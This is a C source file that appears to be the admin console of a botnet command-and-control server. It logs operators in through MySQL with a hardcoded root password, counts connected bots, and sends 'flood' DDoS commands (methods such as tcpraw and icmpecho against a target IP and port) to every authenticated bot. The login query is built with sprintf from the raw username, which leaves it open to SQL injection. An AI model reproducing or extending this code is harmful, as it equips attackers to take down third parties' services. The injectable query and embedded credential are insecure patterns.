#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <mysql/mysql.h>
#include <pthread.h>

#include "client.h"
#include "command.h"

int admin_login_mysql(char *username, char *password)
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, "localhost", "root", "Hoaan@123", "cnc", 0, NULL, 0) == NULL)
    {
#ifdef DEBUG
        printf("[admin] failed to connect to mysql database\n");
#endif
        return -1;
    }

    char query[256];
    sprintf(query, "select password from users where username='%s';", username);

    if (mysql_query(con, query))
    {
#ifdef DEBUG
        printf("[admin] failed to query mysql database\n");
#endif
        mysql_close(con);
        return -1;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL)
    {
#ifdef DEBUG
        printf("[admin] mysql database returned no results\n");
#endif
        mysql_close(con);
        return -1;
    }

    MYSQL_ROW row = mysql_fetch_row(result);
    unsigned long *lengths = mysql_fetch_lengths(result);

    if (row == NULL)
    {
#ifdef DEBUG
        printf("[admin] mysql database returned no results\n");
#endif
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }

    if (strcmp(row[0], password) == 0)
    {
#ifdef DEBUG
        printf("[admin] login made from %s:%s\n", username, password);
#endif
        mysql_free_result(result);
        mysql_close(con);
        return 1;
    }
    else
    {
#ifdef DEBUG
        printf("[admin] failed login attempt from %s:%s\n", username, password);
#endif
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }
}

int admin_create_and_bind(char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;

	memset(&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0)
		return -1;

	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1)
			continue;

		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
        {
#ifdef DEBUG
            printf("[worker] failed getsockopt()\n");
#endif
            exit(0);
        }

		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
			break;

		close(sfd);
	}

	if (rp == NULL)
		return -1;
	else
	{
		freeaddrinfo(result);
		return sfd;
	}
}

void admin_trim(char *str)
{
	int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
    	begin++;

    while ((end >= begin) && isspace(str[end]))
    	end--;

    for (i = begin; i <= end; i++)
    	str[i - begin] = str[i];

    str[i - begin] = '\0';
}

void admin_options_command(int fd)
{
    char sendbuf[1024];
    int i = 0;

    sprintf(sendbuf, "\e[96mOptions\e[94m: \r\n");
    send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
    memset(sendbuf, 0, sizeof(sendbuf));

    for (i = 1; i < ARGUMENT_COUNT; i++)
    {
        sprintf(sendbuf, " \e[96m%s\e[94m:\x1b[97m %s\r\n", cmdargument[i].name, cmdargument[i].desc);
        send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
        memset(sendbuf, 0, sizeof(sendbuf));
    }
}

void admin_help_command(int fd)
{
    char sendbuf[1024];
    int i = 0;

    sprintf(sendbuf, "\e[96mMethods\e[94m: \r\n");

    for (i = 0; i < METHOD_COUNT; i++)
    {
        sprintf(sendbuf, "%s \x1b[97m%s", sendbuf, methods[i].name);
    }

    sprintf(sendbuf, "\e[96m%s\r\n\r\n\e[96mCommands\e[94m: \r\n \e[96mflood <options>\e[94m: \x1b[97mddos attack command\r\n \e[96moptions\e[94m: \x1b[97moptions for flood attack command\r\n \e[96mhelp\e[94m: \x1b[97mdisplay this page\r\n", sendbuf);
    send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
    memset(sendbuf, 0, sizeof(sendbuf));

    sprintf(sendbuf, "\r\n\e[96mExamples\e[94m: \r\n \x1b[97mflood method=tcpraw target=1.2.3.4 port=80 time=30 payload=\"GET / HTTP/1.1\\r\\n\\r\\n\"\r\n \x1b[97mflood method=icmpecho target=1.2.3.4 time=30\r\n");
    send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
    memset(sendbuf, 0, sizeof(sendbuf));
}

void admin_botcount_command(int fd)
{
    struct bot_entry_t {
        int count;
        char arch[32];
    } bot_entry[30];

    int i = 0, q = 0, x = 0, first = 1;

    for (i = 0; i < 30; i++)
    {
        bot_entry[i].count = 0;
        memset(bot_entry[i].arch, 0, sizeof(bot_entry[i].arch));
    }

    for (i = 0; i < CLIENT_MAXFDS; i++)
    {
        if (clients[i].arch_len >= 1 && clients[i].connected == 1)
        {
            if (first == 1)
            {
                strcpy(bot_entry[q].arch, clients[i].arch);
                bot_entry[q].count++;
                first = 0;
                q++;
                continue;
            }
            else
            {
                int found = 0;

                for (x = 0; x < q; x++)
                {
                    if (strcmp(bot_entry[x].arch, clients[i].arch) == 0)
                    {
                        found = 1;
                        bot_entry[x].count++;
                        break;
                    }
                }

                if (found == 0)
                {
                    strcpy(bot_entry[q].arch, clients[i].arch);
                    bot_entry[q].count++;
                    q++;
                    continue;
                }
            }
        }
    }

    for (i = 0; i < q; i++)
    {
        char sndbuf[128];
        sprintf(sndbuf, "\e[96m%s\e[94m: \e[97m%d\r\n", bot_entry[i].arch, bot_entry[i].count);
        write(fd, sndbuf, strlen(sndbuf));
        memset(sndbuf, 0, sizeof(sndbuf));
    }
    memset(bot_entry, 0, sizeof(bot_entry));
}

void *admin_tabtitle(void *arg)
{
	int botcount = 0, chksumtotal = 0, i;
	char title[128];
	int myfd = *((int *)arg);

	while (1)
	{
		for (i = 0; i < CLIENT_MAXFDS; i++)
		{
			if (clients[i].connected == 1)
				botcount++;

			if (clients[i].authed == 1)
                chksumtotal++;
		}

		sprintf(title, "\033]0;Connections: %d | Verified Chksum: %d\007", botcount, chksumtotal);
		if (write(myfd, title, strlen(title)) != strlen(title))
        {
            botcount = 0;
            chksumtotal = 0;
            memset(title, 0, sizeof(title));
            break;
        }

		botcount = 0;
        chksumtotal = 0;
        memset(title, 0, sizeof(title));
		sleep(2);
	}

	pthread_exit(0);
}

void *admin_thread(void *arg)
{
    char rdbuf[512], username[32], password[32], hidden[32];
    int logged_in = 0, clientfd = *((int *)arg);

    read(clientfd, hidden, sizeof(hidden));
    admin_trim(hidden); hidden[strcspn(hidden, "\n")] = 0;

    if (strcmp(hidden, "hello") != 0)
    {
        memset(hidden, 0, sizeof(hidden));
        close(clientfd);
        pthread_exit(0);
        return "";
    }

    write(clientfd, "\033[?1049h", strlen("\033[?1049h"));
    write(clientfd, "\e[96mUsername\e[94m:\x1b[97m ", strlen("\e[96mUsername\e[94m:\x1b[97m "));
    read(clientfd, username, sizeof(username));
    write(clientfd, "\e[96mPassword\e[94m:\x1b[97m ", strlen("\e[96mPassword\e[94m:\x1b[97m "));
    read(clientfd, password, sizeof(password));

    admin_trim(username); username[strcspn(username, "\n")] = 0;
    admin_trim(password); password[strcspn(password, "\n")] = 0;

    if (admin_login_mysql(username, password) != 1)
    {
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        memset(rdbuf, 0, sizeof(rdbuf));
        close(clientfd);
        pthread_exit(0);
        return "";
    }

    FILE *fp;
    char prompt[1024], snbuf[128], path[256], fortune[128];
    pthread_t thread;
    pthread_create(&thread, NULL, &admin_tabtitle, &clientfd);
    fp = popen("/bin/sh -c fortune", "r");
    if (fp == NULL)
    {
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        memset(rdbuf, 0, sizeof(rdbuf));
        memset(prompt, 0, sizeof(prompt));
        close(clientfd);
        pthread_exit(0);
        return "";
    }

    while (fgets(fortune, sizeof(fortune), fp) != NULL)
        sprintf(path, "%s%s", path, fortune);

    pclose(fp);
    write(clientfd, "\033[?1049h", strlen("\033[?1049h"));
    sprintf(prompt, "\r\n%s\r\n", path);
    write(clientfd, prompt, strlen(prompt));
    memset(prompt, 0, sizeof(prompt));
    memset(path, 0, sizeof(path));
    memset(fortune, 0, sizeof(fortune));

    sprintf(prompt, "\e[96m%s\e[94m@\e[96mbotnet\e[94m#\x1b[97m ", username);
    write(clientfd, prompt, strlen(prompt));

    while (memset(rdbuf, 0, sizeof(rdbuf)) && read(clientfd, rdbuf, sizeof(rdbuf)) > 0)
    {
        admin_trim(rdbuf); rdbuf[strcspn(rdbuf, "\n")] = 0;

        if (strcmp(rdbuf, "?") == 0 || strcmp(rdbuf, "help") == 0)
            admin_help_command(clientfd);
        else if (strcmp(rdbuf, "opts") == 0 || strcmp(rdbuf, "options") == 0)
            admin_options_command(clientfd);
        else if (strcmp(rdbuf, "bots") == 0 || strcmp(rdbuf, "botcount") == 0)
            admin_botcount_command(clientfd);
        else if (strcmp(rdbuf, "clear") == 0 || strcmp(rdbuf, "c") == 0)
        {
            fp = popen("/bin/sh -c fortune", "r");
            if (fp == NULL)
            {
                memset(username, 0, sizeof(username));
                memset(password, 0, sizeof(password));
                memset(rdbuf, 0, sizeof(rdbuf));
                close(clientfd);
                pthread_exit(0);
                return "";
            }

            while (fgets(fortune, sizeof(fortune), fp) != NULL)
                sprintf(path, "%s%s", path, fortune);

            pclose(fp);
            write(clientfd, "\033[?1049h", strlen("\033[?1049h"));
            write(clientfd, path, strlen(path));
            write(clientfd, "\r\n", 2);
            memset(path, 0, sizeof(path));
            memset(fortune, 0, sizeof(fortune));
        }
        else if (rdbuf[0] == 'f' && rdbuf[1] == 'l' && rdbuf[2] == 'o' && rdbuf[3] == 'o' && rdbuf[4] == 'd' && rdbuf[5] == ' ')
        {
            char broadcast[1024];
            int len = command_parse(rdbuf, broadcast), i;

            if (len <= 0)
            {
                sprintf(snbuf, "\e[91mIncorrect ussage of the flood command\r\n");
                write(clientfd, snbuf, strlen(snbuf));
                memset(snbuf, 0, sizeof(snbuf));
            }
            else
            {
                sprintf(snbuf, "\e[92mAttack command built (len=%d)\r\n", len);
                write(clientfd, snbuf, strlen(snbuf));
                memset(snbuf, 0, sizeof(snbuf));
            }

            for (i = 0; i < CLIENT_MAXFDS; i++)
            {
                if (clients[i].connected == 1 && clients[i].authed == 1)
                {
                    send(clients[i].fd, broadcast, len, MSG_NOSIGNAL);
                }
            }

            memset(broadcast, 0, sizeof(broadcast));
        }
        else
        {
            sprintf(snbuf, "\e[91mIncorrect ussage, please refer to 'help' command\r\n");
            write(clientfd, snbuf, strlen(snbuf));
            memset(snbuf, 0, sizeof(snbuf));
        }

        write(clientfd, prompt, strlen(prompt));
    }

    memset(username, 0, sizeof(username));
    memset(password, 0, sizeof(password));
    memset(rdbuf, 0, sizeof(rdbuf));
    memset(prompt, 0, sizeof(prompt));
    close(clientfd);
    pthread_exit(0);
    return "";
}

void *admin_listen(void *arg)
{
	int myfd = *((int *)arg), newfd;
	struct sockaddr in_addr;
	socklen_t in_len = sizeof(in_addr);

	if (listen(myfd, SOMAXCONN) == -1)
    {
#ifdef DEBUG
        printf("[admin] failed to listen\n");
#endif
        pthread_exit(0);
        return "";
    }

#ifdef DEBUG
    printf("[admin] listening for admin connections\n");
#endif

	while (1)
	{
		if ((newfd = accept(myfd, &in_addr, &in_len)) == -1)
			break;

		pthread_t cthread;
		pthread_create(&cthread, NULL, &admin_thread, &newfd);
	}

	close(myfd);
	pthread_exit(0);
    return "";
}
